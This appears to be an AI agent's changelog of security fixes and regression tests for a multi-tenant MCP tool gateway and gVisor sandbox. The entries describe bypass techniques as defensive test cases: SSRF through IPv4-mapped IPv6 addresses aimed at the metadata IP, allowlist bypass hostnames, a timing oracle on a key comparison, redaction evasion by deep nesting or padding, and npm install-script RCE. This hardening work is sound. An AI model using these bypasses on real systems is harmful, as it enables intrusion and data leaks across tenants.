  - CHG-0134 (2026-07-03) — LOW test-only regression-lock (NO code change): Tier-2 (Bedrock) scan error fails CLOSED under strict. Verified sound: on a Tier-2 exception (scan_prompt_with_tier2 raises during a Bedrock outage), _scan_text_tier2 blocks under strict_mode (defaults to 'strict') and forwards under fail_open (Tier-1 field redaction already ran). scanner-is-None fails open even under strict INTENTIONALLY (don't brick a non-Bedrock deployment; the '"strict" in fallback' gate distinguishes tier2_error_strict from scanner_unavailable). GAP: no test forced a Tier-2 EXCEPTION -> a refactor dropping the strict branch would silently forward results unscanned-by-Tier-2 during an outage (1.4 degradation leak) with a green suite. FIX (test only, test_mcp_scan_orchestrator.py): test_tier2_bedrock_exception_fails_closed_under_strict asserts strict->blocked, fail_open->forward. VERIFY: orchestrator suite 38 passed. Complements CHG-0047/0057. Evidence mcp-parallel/findings/backstop-p-tier2-error-failclosed-lock/.

  - CHG-0135 (2026-07-03) — MEDIUM reliability/defense-in-depth: sandbox agent /rpc leaked unexpected exceptions as raw HTTP 500. services/mcp-broker/sandbox-image/agent/main.py /rpc wrapped all transport dispatch in one try but only caught UpstreamError + RuntimeError. Any OTHER exception (TimeoutError/OSError/ValueError/bug) escaped -> raw HTTP 500: broker/gateway lost the jsonrpc_id correlation + error classification (generic 502), a raw 500 can carry internal detail, and under chaos (resets/timeouts) unexpected excs are the likely case. FIX: final `except Exception` returns a structured JSON-RPC error with the id + GENERIC message ("internal sandbox agent error", -32000); full detail LOG.exception'd server-side (safe metadata only); asyncio.CancelledError (BaseException) not caught -> cancellation still propagates. +1 test (unexpected ValueError -> 200 JSON-RPC error, id preserved, no leak). VERIFY: test_rpc_unified.py passes; full agent suite green. Evidence mcp-parallel/findings/backstop-p-agent-rpc-catchall/.

  - CHG-0136 (2026-07-03) — MEDIUM cross-tenant defense-in-depth: sandbox agent /rpc was UNAUTHENTICATED (network isolation was the SOLE control). If isolation fails (host-run broker shared bridge / per-org-net misconfig), a sibling sandbox could call another org's agent unauthenticated. FIX: opt-in MCP_AGENT_INTERNAL_KEY end-to-end — agent (main.py) requires a matching X-Sandbox-Agent-Key (constant-time hmac) when the env is set (else allow, backward-compat); broker _post_agent_rpc (routes.py) sends the header when configured (headers=_headers or None keeps the no-header contract); docker_manager _run_kwargs provisions the SAME key into the sandbox env; MCP_AGENT_INTERNAL_KEY added to shared _SECRET_ENV_DENYLIST (and not in _SAFE_ENV_PASSTHROUGH) so _build_child_env NEVER passes it to a spawned MCP server — which is what makes a single broker-wide key a real cross-tenant control (a malicious server in A can't read it). Opt-in; mixed old/new sandboxes safe. +tests (agent auth, docker provision, broker header). VERIFY: broker 166 passed; full agent suite green; denylist byte-probe confirms the key never reaches a child. Evidence mcp-parallel/findings/backstop-p-agent-rpc-auth/.

  - CHG-0137 (2026-07-03) — MEDIUM correctness/safety: gateway retried tools/call after dispatch → double-execution. gateway/ai_mesh_gateway/mcp_sandbox_client.py `_request_with_503_retry` retried on 503 (safe) AND any httpx.HTTPError (incl. ReadTimeout). For a tools/call (gateway→broker→agent→upstream EXECUTES the tool), a slow reply that ReadTimeouts means the tool ALREADY ran, but the retry re-POSTs → the upstream executes it AGAIN (send-email-twice/double-charge/delete+recreate). FIX: idempotency-aware — `_NON_IDEMPOTENT_METHODS={"tools/call"}`; `_request_with_503_retry(idempotent=...)` retries a non-idempotent call on httpx.HTTPError ONLY if PRE-SEND (ConnectError/ConnectTimeout/PoolTimeout — tool couldn't have run); a POST-send error (ReadTimeout/reset) fails immediately (no retry). 503 retry unchanged. broker_send_rpc passes idempotent=(method != tools/call). +4 tests. VERIFY: test_mcp_sandbox_client.py 17 passed; full gateway 1874 passed. Evidence mcp-parallel/findings/backstop-p-toolscall-retry-double-exec/.

  - CHG-0138 (2026-07-03) — LOW test-only regression-lock (NO code change): agent SSRF IP classifier blocks IPv6 + IPv4-mapped-IPv6 + all internal ranges. Verified sound: _resolved_ip_blocked (CHG-0067) + _assert_upstream_not_ssrf block metadata (169.254.169.254/fd00:ec2::254), ipaddress is_private/loopback/link_local/reserved/multicast/unspecified, fail-close on unparseable, check ALL resolved IPs (DNS-rebind). Byte-probed the IPv4-mapped-IPv6 bypass (::ffff:169.254.169.254) + IPv6 battery -> ALL blocked (Py3.14 ipaddress flags mapped is_private). GAP: existing SSRF tests only cover the flow, not the classifier's IPv6/mapped coverage -> a refactor could silently re-open egress. FIX (test only): test_ssrf_ip_classifier.py parametrizes a full must-block battery + must-allow public set + 2 async end-to-end. VERIFY: 23 passed; agent collect 107; broker 166 passed. RESIDUAL (out of scope): DNS-rebinding TOCTOU (httpx re-resolves at connect; needs IP pinning). Evidence mcp-parallel/findings/backstop-p-ssrf-classifier-lock/.

  - CHG-0139 (2026-07-03) — LOW test-only regression-lock (NO code change): the MCP audit record never contains the raw PII/secret value (leak-at-rest). Verified: _record_gateway_event serializes decision/reason/compliance_tags/scan_findings(to_finding_dict)/metadata into the MCPEvent; McpFinding carries only entity_type/score/offsets/tier/threat_type/detail(TYPE names)/matched_kinds(TYPE names) — NO raw-value field; tags are CODES (normalized to catalog at control tasks.py); metadata is {transport,enforced_at,scan_trace}. Byte-probed AWS key/email/SSN/GitHub PAT/Stripe/internal-IP → raw value ABSENT from the audit-serializable blob; result redacted. GAP: no test asserted the AUDIT record (vs egress result) carries no raw value → a future McpFinding.detail quoting the span, or metadata carrying raw content, would leak into the audit DB with a green suite. FIX (test only): test_mcp_audit_no_raw_leak.py — battery asserts raw absent from findings/tags/metadata + scanner detected + result redacted. VERIFY: 6 passed; full gateway 1926 passed. Evidence mcp-parallel/findings/backstop-p-audit-no-raw-leak-lock/.

  - CHG-0140 (2026-07-03) — MEDIUM DoS: internal chat-pipeline MCP routes had no inbound body-size cap. gateway/ai_mesh_gateway/mcp_proxy.py internal_tools_call + internal_discover_tools did `body = await request.json()` with NO cap (buffers unbounded), while org_mcp_jsonrpc/org_mcp_tool_call/ext_mcp_proxy all cap via _mcp_body_too_large (CHG-0034) + _mcp_read_body_capped (CHG-0063) — the _mcp_body_too_large docstring even claims "every MCP entry point" uses the streaming cap. The chat user's tool ARGUMENTS flow through these routes, so a huge body → gateway memory-exhaustion DoS. FIX: both internal routes now apply the cap (413 mcp_body_too_large) after the internal-key check, before request.json() (which reuses the cached capped bytes). +4 tests (both routes: oversized Content-Length + chunked). VERIFY: test_mcp_body_cap.py 13 passed; full gateway 1930 passed; all 5 MCP routes now apply _mcp_read_body_capped. Evidence mcp-parallel/findings/backstop-p-internal-routes-body-cap/.

  - CHG-0141 (2026-07-03) — MEDIUM secure-default / tenant-isolation: stdio transport default was fail-OPEN (spawned untrusted npm/uvx IN the gateway host process). gateway/ai_mesh_gateway/mcp_stdio_adapter.py `_STDIO_IN_PROCESS_DEFAULT` was "true". `send_jsonrpc()` dispatches on `_stdio_in_process()`: False → `_send_jsonrpc_broker` (route the stdio server into the per-org gVisor sandbox via the broker); True → `_send_jsonrpc_in_process` (spawn npx/uvx/node IN the gateway process on the host). With default "true", ANY deploy that didn't explicitly set MCP_STDIO_IN_PROCESS=false ran org-registered stdio servers ON the gateway host — untrusted 3rd-party npm/PyPI code in the shared multi-tenant process, defeating "ALL transports in the sandbox / no unknown npm on the host / NOTHING in the main backend". Fail-OPEN: the UNSAFE mode was the one you got by omission. FIX: `_STDIO_IN_PROCESS_DEFAULT = "false"` → unset routes stdio through the per-org sandbox (same as remote transports); the in-gateway spawn is now OPT-IN via MCP_STDIO_IN_PROCESS=true (dev-only/single-tenant, no broker). All 4 pre-existing flag tests set the env explicitly (monkeypatch), so none relied on the old default. +2 tests. VERIFY: test_mcp_stdio_adapter_branch.py 8 passed (new test_stdio_default_is_sandbox_secure: unset → False + DEFAULT=="false"; test_stdio_in_process_still_opt_in: =true → True); full gateway 1948 passed 0 failed (proves flip is test-safe). Evidence mcp-parallel/findings/backstop-p-stdio-secure-default/.

  - CHG-0142 (2026-07-03) — LOW-MEDIUM supply-chain defense-in-depth (item 8 sub-item 2): sandbox image baked NO npm-level control — install-scripts were disabled only by one runtime env path. Untrusted tenant stdio servers are fetched via npx/npm in the sandbox; a package's preinstall/install/postinstall is an RCE vector. CHG-0044 force-pins npm_config_ignore_scripts=true in _build_child_env (shared/ai_mesh_shared/mcp_stdio_common.py) — authoritative but the ONLY thing disabling scripts, covering only the one spawn path that calls it (not a manual/debug npx, a future spawn path that forgets the env, or a regression that drops the pin). services/mcp-broker/sandbox-image/Dockerfile baked no .npmrc → outside that path npx defaulted ignore-scripts=false. FIX: bake a GLOBAL npmrc at /usr/local/etc/npmrc (= $PREFIX/etc/npmrc for the /usr/local prefix, read for ANY user) with ignore-scripts=true (+ audit=false/fund=false/update-notifier=false to cut incidental egress from the egress-locked sandbox); root-owned (created pre-USER sandbox) so the unprivileged user can't rewrite it. npm precedence (global < env) → the CHG-0044 env still wins and AGREES = belt-and-suspenders, no behavior change; the package bin (the MCP server) still runs, only install hooks suppressed. +1 guard test. VERIFY: test_sandbox_image.py 5 passed (new test_dockerfile_bakes_global_npmrc_ignore_scripts asserts ignore-scripts=true REDIRECTED into /usr/local/etc/npmrc); broker suite -k "not websocket" 167 passed 0 failed. Real docker-build gate + live malicious-postinstall egress-capture proof host-blocked (no Docker here) → item 8 stays [ ]. Evidence mcp-parallel/findings/backstop-p8-npmrc-global-ignore-scripts/.

  - CHG-0143 (2026-07-03) — LOW-MEDIUM observability of a security-critical degraded posture (item 12): sandbox ran under runc (no gVisor) SILENTLY when the runtime was unset/unavailable and not required. services/mcp-broker/src/sandbox/docker_manager.py _resolve_runtime only validates/raises when MCP_SANDBOX_RUNTIME_REQUIRED=true; in the default (not-required) path it returned the runtime as-is with NO signal — unset → None → Docker default runc (shared host kernel, no gVisor); set to runsc but not installed → returned "runsc" anyway. docs/mcp/BACKSTOP_FINDINGS.md documented the compose broker sets neither env + prod compose defines no broker → "silently degrading instead of failing closed"; an operator who mis-set the env and thinks they have gVisor gets no signal. Defaulting required=true would break dev/CI (no gVisor) + belongs to deployment config. FIX: warn ONCE per manager (self._runtime_degraded_warned, set in __init__) in the not-required branch — unset → warn "WITHOUT a kernel-isolation runtime … set MCP_SANDBOX_RUNTIME=runsc + …_REQUIRED=true"; configured-but-unavailable → warn "NOT available … set …_REQUIRED=true to fail closed"; healthy case quiet. Never raises; returned runtime identical = ZERO behavior change; required=true path untouched. +3 tests. VERIFY: test_sandbox_lifecycle.py -k runtime 7 passed (unset→None+warn-once; unavailable→"runsc"+warn no-raise; available→"runsc"+no-warn); full lifecycle 49 passed; broker -k "not websocket" 170 passed 0 failed. Real remediation (set envs in both compose files, define broker in prod compose, prove Runtime=runsc live) host-blocked → item 12 stays [ ]. Evidence mcp-parallel/findings/backstop-p12-runtime-degraded-warning/.

  - CHG-0144 (2026-07-03) — LOW-MEDIUM timing side-channel (item 9 gateway authz): the admin-RBAC server-to-server bypass compared the shared internal key with a non-constant-time ==. gateway/ai_mesh_gateway/main.py _require_admin_role bypasses admin-RBAC on /v1/admin/* when the caller presents GATEWAY_INTERNAL_API_KEY in X-Gateway-Internal-Key, but did `header_key == internal_key` — str.__eq__ short-circuits on the first differing byte → time correlates with the matching-prefix length (secret-comparison timing oracle → byte-by-byte key recovery). Every other gateway secret check uses constant-time compare (mcp_proxy._valid_internal_key hmac.compare_digest, middleware:301, metrics_auth secrets.compare_digest, policy_signing); this shim was the lone plain-== omission. FIX: `if header_key and hmac.compare_digest(header_key, internal_key): return None` (+import hmac). Behaviour identical (correct key bypasses; wrong key → require_admin reject). +4 tests (correct→None; one-byte-off→401/403; missing header→401/403; source guard). VERIFY: test_admin_internal_key_constant_time.py 4 passed. NOTE: full gateway suite has 6-7 PRE-EXISTING failures in an unrelated zero-width-unicode/scan subsystem (another session's) — proven NOT mine by reproducing them on clean-HEAD main.py (those tests never touch _require_admin_role). Evidence mcp-parallel/findings/backstop-p9-admin-key-constant-time/.

  - CHG-0145 (2026-07-03) — LOW test-only regression-lock (NO production code change): backend-bound actor-authz headers are non-spoofable from inbound headers (item 3 per-actor authz). Verified sound: _control_request_headers returns a fresh dict copying NO inbound header; _backend_proxy_headers sets X-Gateway-Roles/User-Id/Key-Prefix/Project-Id from _get_auth_context(request) (request.state.auth_context, server-derived from the key's Redis payload; AuthContext.roles from owner.profile.roles). Gateway never reads X-Gateway-Roles/User-Id from an inbound request (grep 0 hits); no live path forwards inbound headers wholesale (only forwarder _proxy is dead code). GAP: no test asserted non-spoofability → a future change (merging request.headers, reviving _proxy, a route trusting inbound X-Gateway-Roles) would silently open role-escalation with a green suite. FIX (test only, test_mcp_bare_proxy_scan.py): a request whose INBOUND headers spoof X-Gateway-Roles: admin,superuser / X-Gateway-User-Id: 999999 → asserts backend headers carry the AUTH-context values (viewer/42/…) and NONE of the spoofed values appear; empty roles → no X-Gateway-Roles header. VERIFY: test_mcp_bare_proxy_scan.py 60 passed (2 new); full gateway 2002 passed 0 failed. Did NOT add ingress X-Gateway-* stripping (no live path forwards/trusts them; stripping risks breaking header propagation not integration-testable here). Evidence mcp-parallel/findings/backstop-p3-actor-header-nonspoof-lock/.

  - CHG-0146 (2026-07-03) — LOW-MEDIUM resource-exhaustion/DoS containment (items 10 & 17): broker agent-RPC timeout had NO upper bound (caller-supplied timeout → unbounded connection hold). services/mcp-broker/src/sandbox/routes.py _forward_sandbox_rpc set the per-RPC agent timeout via max(_AGENT_TIMEOUT, body.timeouts["init_seconds"], body.timeouts["method_seconds"]) with no ceiling. body.timeouts is a caller-supplied dict on SandboxRpcRequest. Normally the gateway sends init=120/method≈60 (≈130s), but the broker TRUSTS the caller: a misconfigured gateway (MCP_STDIO_INIT_TIMEOUT huge), a buggy caller, or a non-gateway caller could set init_seconds=99999 → broker holds the agent httpx connection + serving coroutine open ~28h; a handful exhausts the connection pool/event-loop → availability DoS for all orgs. The broker must self-defend (parity with gateway body caps CHG-0034/0063/0140). FIX: _AGENT_TIMEOUT_MAX = max(_AGENT_TIMEOUT, env MCP_BROKER_AGENT_TIMEOUT_MAX default 900s); after the max() fold, clamp `if timeout > _AGENT_TIMEOUT_MAX: log + timeout = _AGENT_TIMEOUT_MAX`. Ceiling ≥ base so an operator's explicit base isn't clipped; 900s generous so no legitimate slow cold-start/tool call is affected. +2 tests. VERIFY: test_sandbox_routes.py 16 passed (init=method=99999 → effective==_AGENT_TIMEOUT_MAX, 99999 never used; init=120/method=60 → effective==base, unclamped); broker -k "not websocket" 172 passed 0 failed. Evidence mcp-parallel/findings/backstop-p10-agent-rpc-timeout-clamp/.

  - CHG-0147 (2026-07-03) — LOW test-only regression-lock (NO production code change): sandbox egress allowlist is normalized-EXACT-match (no subdomain/suffix bypass) (item 12 egress-lockdown). services/mcp-broker/sandbox-image/agent/upstream_manager.py _validate_upstream (the pre-dial egress chokepoint for all remote transports) matches the URL host against allowed_hosts by NORMALIZED (lowercase/trailing-dot-stripped/IDNA) EXACT set membership, fail-closed — verified correct. GAP: the only existing test covered a wholly-different host; it did NOT cover the edge cases where allowlist bugs hide — subdomain of an allowed host (evil.mcp.example.com), string-suffix attack not label-aligned (notmcp.example.com — the exact case a naive endswith wrongly allows), allowed host as a left label (mcp.example.com.evil.com), and the normalization cases that must still ALLOW (case/trailing-dot). A future "support subdomains" refactor to endswith/in would silently open an egress-exfil bypass with a green suite. FIX (test only, test_ssrf_ip_classifier.py): +13 parametrized — deny non-exact (subdomain/suffix/left-label/different/IP-not-in-list → egress denied -32002); allow normalized-exact (exact/case both sides/trailing-dot both sides/IP-exact/second-of-multiple → returns None); empty allowed_hosts → fail closed. VERIFY: test_ssrf_ip_classifier.py 36 passed (13 new); suffix_string_attack (notmcp.example.com DENIED) proves exact set membership not endswith. _validate_upstream is pure (no dial/network) → version-agnostic (runs on 3.14 venv though image is 3.12). RESIDUALS (documented, not shipped): (1) broker _forward_sandbox_rpc reads the agent response .json()/.text with no size cap — real fix needs client.post→capped client.stream (breaks all post-mocks; LOW/gVisor-contained) deferred; (2) _log_stderr stderr-flood (py3.12-vs-3.14 asyncio-dependent, unverifiable vs prod). Evidence mcp-parallel/findings/backstop-p12-egress-allowlist-exact-match-lock/.

  - CHG-0148 (2026-07-03) — MEDIUM 1.4 leak: name-based field redaction bypassable by DEEP NESTING (field below max_depth=10 egressed RAW). Both apply_field_redaction impls — gateway/ai_mesh_gateway/policy_engine.py + control/ai_mesh_control/policy/redaction.py — walked the tool result with max_depth=10 and returned the PARTIALLY-redacted result on overflow (fail-OPEN). But the gateway only rejects results deeper than _MCP_MAX_RESULT_DEPTH (500) BEFORE redaction → a policy's redaction_fields target nested at depth 11..500 was never visited and egressed RAW. Empirically confirmed (pure import): ssn wrapped 40 deep survived masking. Opaque name-redacted fields (session_token/internal_id) are NOT caught by the content/pattern scan, so field redaction is their only protection. FIX: max_depth 10→500 (covers the depth guard) + convert the recursive _walk to an ITERATIVE explicit-stack walk (a 500-deep recursion would blow the recursion limit → raise → caller fail-open, re-introducing the leak; iterative has no recursion exposure, identical masking semantics, masked/identity-on-noop preserved, work still bounded by max_nodes). Applied to BOTH impls (chat/control + adapter/gateway mask identically). +1 test. VERIFY: test_mcp_scan_orchestrator.py -k field_redaction 8 passed (new deep-nesting lock: ssn 40-deep redacted, exact leaf [REDACTED]; homoglyph/non-mutating/identity still pass); full gateway 2010 passed 0 failed; control variant verified via standalone pure-import repro. RESIDUALS (documented): (1) node-count overflow (max_nodes=100k) still fail-open on a huge-but-shallow result → needs fail-closed block; (2) stdlib copy.deepcopy RecursionErrors ~250 depth → caller fail-open in the ~250..500 window (pre-existing; recommend lowering _MCP_MAX_RESULT_DEPTH below the deepcopy limit or failing closed). Evidence mcp-parallel/findings/backstop-p2-field-redaction-deep-nesting-bypass/.

  - CHG-0149 (2026-07-03) — LOW-MEDIUM robustness (closes CHG-0148 residual #2): MCP result/arg depth guard was mis-calibrated ABOVE the recursion-crash threshold it pre-empts. gateway/ai_mesh_gateway/mcp_proxy.py CHG-0115 proactive depth guard (_exceeds_nesting_depth) is meant to fire BEFORE the recursive result scan hits the recursion limit, emitting a clean RESOURCE_LIMIT block instead of relying on catching a fragile mid-scan RecursionError. But it was set at 500, while copy.deepcopy (first recursive op in apply_field_redaction) empirically RecursionErrors at ~498 (shallow stack; LOWER under a real ambient stack) and the recursive scan crashes earlier — so a depth-498..500 result passed the guard, crashed deepcopy → caught only as generic SCAN_ERROR (not RESOURCE_LIMIT), and left the control-plane redactor (whose deepcopy-crash handling differs) exposed to results the gateway forwarded. NOTE: corrects CHG-0148 residual #2 — this is NOT a fail-open leak on the gateway floor path (the except Exception fail-closes it), but a guard-calibration + control-path-robustness gap. FIX: _MCP_MAX_RESULT_DEPTH 500→200 (env-tunable; also defaults _MCP_MAX_ARG_DEPTH); 200 is ~10× any realistic legit result but comfortably below the crash threshold, so the iterative guard reliably fires first (clean RESOURCE_LIMIT block before any recursive copy/scan). Depth-201..~498 now blocks (fail-closed) vs redact-and-forward; depth >200 is pathological. +1 test. VERIFY: test_mcp_result_block_count_cap.py 15 passed (new test_depth_cap_fires_below_deepcopy_recursion_limit: depth-300 → result_too_deeply_nested + RESOURCE_LIMIT, no result_scan_error); full gateway 2034 passed 0 failed. RESIDUAL: CHG-0148 #1 (node-count overflow) unchanged (clean fix over-blocks benign large results — documented tradeoff). Evidence mcp-parallel/findings/backstop-p2-depth-guard-recalibrate/.

  - CHG-0150 (2026-07-03) — MEDIUM 1.4 leak + resource-bomb containment (CLOSES CHG-0148 residual #1): result node-count guard. apply_field_redaction bounds its walk with max_nodes=100k and returned the PARTIALLY-masked result on overflow (fail-open). The depth guard bounds NESTING but not WIDTH — a wide-but-shallow result (10MB list of small objects, millions of nodes) passed all caps, and a redaction_fields target beyond the 100k-th node egressed RAW (pure-import repro: ssn behind 150k padding nodes leaked). Opaque named fields aren't caught by the content scan. Separately, such a wide result forces a ~2.1s copy.deepcopy (measured; on the FULL structure regardless of max_nodes) + recursive scan = resource bomb. FIX: (1) gateway/ai_mesh_gateway/mcp_proxy.py — _exceeds_node_count (iterative, short-circuits O(limit)) + _MCP_MAX_RESULT_NODES (default 1M) wired into _scan_tool_result_floor after the depth guard: a result wider than the cap BLOCKS cleanly (RESOURCE_LIMIT/result_too_many_nodes) BEFORE the deepcopy/scan/redact, fail-closed (monitor forwards unscanned). (2) redaction max_nodes 100k→2M in BOTH impls (policy_engine.py + control/policy/redaction.py) — above the 1M guard so anything passing is FULLY walked. Behavior: results wider than 1M nodes (~10× any realistic result) block under a real action (trims resource bombs). +4 tests (kept light). VERIFY: test_mcp_result_block_count_cap.py + test_mcp_scan_orchestrator.py pass; full gateway 2053 passed 0 failed; control verified via standalone pure-import repro. (A mid-work test_output_guard_redos flake was from initial million-node test payloads — passes in isolation, references none of this code — fixed by lightening the tests.) Evidence mcp-parallel/findings/backstop-p2-node-count-guard/.

  - CHG-0151 (2026-07-03) — MEDIUM cross-tenant availability / resource-bomb containment (closes a residual deferred across CHG-0146/0147): broker buffered the sandbox agent's RPC response UNBOUNDED. services/mcp-broker/src/sandbox/routes.py _post_agent_rpc forwarded each RPC via `await client.post(...)` and _forward_sandbox_rpc read the reply with response.json()/.text — httpx.post() buffers the ENTIRE body unbounded. The sandbox agent runs untrusted tenant MCP servers (gVisor + X-Sandbox-Agent-Key are the isolation), but the broker TRUSTED the agent's reply size — and the broker is ONE shared process routing every org's sandbox, so a buggy/compromised agent returning a huge body OOMs it = cross-tenant availability breach. FIX: _AGENT_MAX_RESPONSE_BYTES (16 MiB = 2× the agent's 8 MiB self-cap; env MCP_BROKER_AGENT_MAX_RESPONSE_BYTES) + _read_agent_response_capped (client.stream + aiter_bytes, raises HTTP 502 the instant the running total crosses the ceiling; never holds > ceiling in memory; rebuilds a fully-read httpx.Response used .json()/.text unchanged); _post_agent_rpc calls it instead of .post(). Cold-start transport error still raises httpx.HTTPError (retry loop unchanged); too-large reply raises HTTPException(502) → fails fast no retry. Required migrating 2 broker test files' agent-RPC mocks post→stream (shared _agent_stream_mock) — the reason this was deferred; migration mechanical, all 25 affected tests pass. +2 cap tests. VERIFY: test_sandbox_routes.py + test_agent_ready_retry.py 25 passed (over-cap 2KiB/1KiB→502; under-cap ok); broker -k "not websocket" 174 passed 0 failed. Parity with gateway upstream cap CHG-0064 / agent upstream cap CHG-0066. Evidence mcp-parallel/findings/backstop-p10-broker-agent-response-cap/.

  - CHG-0152 (2026-07-03) — LOW-MEDIUM availability/resource-bomb containment (item 17; closes the last deferred code residual, flagged since CHG-0144): sandbox agent _log_stderr self-hung on an oversized stderr line. services/mcp-broker/sandbox-image/agent/stdio_manager.py _log_stderr drains a spawned stdio server's stderr via readline() inside a while True wrapped by a catch-all `except Exception: pass` OUTSIDE the loop. The StreamReader has limit=_MAX_LINE_BYTES (8MiB); an untrusted server flooding stderr with a huge UNTERMINATED line makes readline() raise once past the limit → the raise hit the outer except → the loop EXITED → stderr never drained again → OS pipe filled → child BLOCKED on write(2) to stderr = self-hang of that org's server. DEFERRED since CHG-0144 because the raise type + buffer disposition are Python-version-sensitive (sandbox=3.12, test venv=3.14) — now verified on BOTH via docker python:3.12-slim: readline() over-limit CONSUMES the buffer on both (3.14→LimitOverrunError, 3.12→ValueError; my earlier "3.12 leaves data" note was WRONG). FIX: catch INSIDE the loop and `continue` (NO blocking read — the CHG-0144 read() drain was the dead-end): `except (asyncio.LimitOverrunError, ValueError): LOG.warning(...); continue`. A huge line drains in limit-sized chunks across successive raises; a normal line after the flood reads cleanly; the reader survives. stdout reader unchanged (fail-closes oversized stdout). +2 tests. VERIFY: test_stdio_exit_reason.py 11 passed (flood-survival + normal-path); broader fast agent sweep 88 passed; CROSS-VERSION: REAL _log_stderr run on python:3.12-slim via docker (repo mounted) → survived flood, next line captured=True. Evidence mcp-parallel/findings/backstop-p17-stderr-flood-self-hang/.

  - CHG-0153 (2026-07-03) — LOW defense-in-depth (item 8): sandbox image put CWD on the agent's Python import path (PYTHONPATH trailing colon). services/mcp-broker/sandbox-image/Dockerfile had `ENV PYTHONPATH="/opt/shared:${PYTHONPATH}"`; ${PYTHONPATH} is UNDEFINED at build → resolved to literal "/opt/shared:" — trailing colon = an EMPTY sys.path entry = the process CWD (verified in the built image: PYTHONPATH=[/opt/shared:], "" in sys.path == True). A sandbox agent spawning untrusted MCP servers must not carry CWD on its import path (import-hijack footgun); also the source of the docker build UndefinedVar(line 45) warning. FIX: `ENV PYTHONPATH="/opt/shared"` (plain; docker run -e overrides anyway). VERIFY: rebuilt via docker (no UndefinedVar warning); ran the REAL agent CMD uvicorn agent.main:app → /health {"status":"ok"} + "Application startup complete" (empty entry NOT load-bearing — uvicorn imports the agent pkg itself, ai_mesh_shared via /opt/shared); runtime PYTHONPATH=[/opt/shared]. BONUS (docker IS available here): verified CHG-0142 END-TO-END in a rebuild — /usr/local/etc/npmrc=ignore-scripts=true(+audit/fund/update-notifier off), `npm config get ignore-scripts`→true as the sandbox user, globalconfig=/usr/local/etc/npmrc, root-owned. OPERATIONAL FINDING for the deploy owner: the deployed ai-mesh/mcp-sandbox:latest PREDATES CHG-0142 (ignore-scripts→false there) — the image must be REBUILT + redeployed (sandboxes recreated) for the baked-npmrc + PYTHONPATH controls to take effect (CHG-0044 per-spawn env pin still enforces ignore-scripts at runtime today). gVisor/runsc NOT installed (docker info Runtimes: runc) → item 12 still blocked. Evidence mcp-parallel/findings/backstop-p8-sandbox-pythonpath-cwd/.
